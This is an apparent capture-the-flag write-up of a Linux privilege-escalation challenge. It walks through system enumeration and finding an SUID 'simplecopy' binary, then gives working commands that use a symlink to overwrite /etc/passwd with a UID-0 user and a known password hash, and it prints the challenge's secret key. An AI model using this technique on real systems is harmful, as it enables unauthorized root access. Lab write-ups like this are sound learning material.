# Linux Priv ESC
Another poem, some more hints. Start in bash but need to get root. Then I need to run an executable as root to complete the challenge. 

The hint page links to [some methods]('https://payatu.com/blog/a-guide-to-linux-privilege-escalation/') to escalate privileges in linux.

first let's see who I am
```
whoami
elf
```
I'm the elf user. 

## Searching for exploits. 
Now let's see if what kernel version we are running,maybe we have a vulnerable version?
```
uname -a
Linux 23eda691ae1e 5.10.0-26-cloud-amd64 #1 SMP Debian 5.10.197-1 (2023-09-29) x86_64 x86_64 x86_64 GNU/Linux
```
Looks like Linux 5.10.0 is [vulnerable to lots of stuff]('https://security.snyk.io/package/linux/debian:10/linux-5.10'). 

Let's search [Exploit DB]('https://www.exploit-db.com/exploits/50808') for an explot that affects linux 5.10.0

## Dirty Pipe exploit
Looks like [dirty pipe]('https://www.hackers-arise.com/post/privilege-escalation-the-dirty-pipe-exploit-to-escalate-privileges-on-linux-systems#:~:text=DirtyPipe%20is%20a%20local%20privilege,any%20file%20under%20certain%20conditions.') can be used for this version of the linux kernel. 

Let's follow the above tutorial, first by checking it is vulnerable. 

## The wrong way
Hmm looks like the server doesn't have Git installed (and I don't have privleges to install any cli tools), so will have to find another way to do this. 

## Follow the hints
The hint page links to a more comprehensive guide to [basic linux privilege escalation]('https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/')

Let's go through step by step to learn more about the system we are trying to exploit.

```
cat /etc/issue
Ubuntu 20.04.6 LTS \n \l

cat /etc/*-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=20.04
DISTRIB_CODENAME=focal
DISTRIB_DESCRIPTION="Ubuntu 20.04.6 LTS"
NAME="Ubuntu"
VERSION="20.04.6 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.6 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal
```
What's in /etc?

```
ls /etc/
adduser.conf            gai.conf      libaudit.conf  profile.d         shells
alternatives            group         login.defs     rc0.d             skel
apt                     group-        logrotate.d    rc1.d             subgid
bash.bashrc             gshadow       lsb-release    rc2.d             subgid-
bindresvport.blacklist  gshadow-      machine-id     rc3.d             subuid
cloud                   host.conf     mke2fs.conf    rc4.d             subuid-
cron.d                  hostname      mtab           rc5.d             sysctl.conf
cron.daily              hosts         networks       rc6.d             sysctl.d
debconf.conf            init.d        nsswitch.conf  rcS.d             systemd
debian_version          issue         opt            resolv.conf       terminfo
default                 issue.net     os-release     rmt               update-motd.d
deluser.conf            kernel        pam.conf       runtoanswer.yaml  xattr.conf
dpkg                    ld.so.cache   pam.d          security
e2scrub.conf            ld.so.conf    passwd         selinux
environment             ld.so.conf.d  passwd-        shadow
fstab                   legal         profile        shadow-

```
Well runtoanswer.yaml could be interesting to see as it's a config file, but we get permission denied. 

## Escalation using SUID binaries
First let's see what binaries on the system have SUID permissions
```
find / -perm -u=s -type f 2>/dev/null

/usr/bin/chfn
/usr/bin/chsh
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/passwd
/usr/bin/simplecopy
```
What does `simplecopy` do?

```
simplecopy --help
Usage: simplecopy <source> <destination>
```
Huh looks like we could use this in a similar way that `cp` is used fro [privilege escalation]('https://gtfobins.github.io/gtfobins/cp/')

Let's use this to copy the `runtoanswer.yaml` file to `stdout`

```
simplecopy runtoanswer.yaml /dev/stdout

# This is the config file for runtoanswer, where you can set up your challenge!
---

# This is the completionSecret from the Content sheet - don't tell the user this!
key: b08b538569e395f88e12ef9fe751ac39

# The answer that the user is expected to enter - case sensitive
# (This is optional - if you don't have an answer, then running this will immediately win)
answer: "santa"

text: |
  Who delivers Christmas presents?

success_message: "Your answer is *correct*!"
failure_message: "Sorry, that answer is *incorrect*. Please try again!"

# A prompt that is displayed if the user runs this interactively (they might
# not see this - answers can be entered as an argument)
prompt: "> "

# Optional: a time, in seconds, to delay before validating the answer (to
# prevent guessing)
delay: 1

# Optional: skip (most) stdout output if the answer is correct
headless: false

# If set to true, don't exit after the user asks
keep_going: false

# Optional: play this sound on completion or failure
#completion_sound: 'myhappysound.mp3'
#failure_sound: 'mysadsound.mp3'

# Close the terminal when it is completed?
exit_on_completion: false
```

This has the completion secret, but I'll still need to run the runtoanswer binary as root to complete this challenge. 

We know we can copy files with root privileges so the key will be copying the `/etc/passwd` file and adding a new user. then we will need to create a symlink to this file so the system uses this. Let's follow this [tutorial]('https://materials.rangeforce.com/tutorial/2019/11/07/Linux-PrivEsc-SUID-Bit/')

first create a user identity with already hashed password (`mrcake` for this example)
`elf2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash`

Then copy the `/etc/passwd` file to `source/passwd` echo in this bad user and create a symlink
```
#use cp to create the malicious passwd file and create a new user
mkdir source
cp /etc/passwd source/passwd
echo 'elf2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash' >> source/passwd

# create a symlink destination 
ln -s /etc destination

# use the simplecopy binary to copy the malicious passwd file to the destination folder, becasue of the symlink this will overwrite the /et/passwd file
simplecopy source/passwd destination/passwd

# get a root shell
su elf2
Password: mrcake

whoami
root
```
Then go to the root directory to find the binary to run and complete the challenge!
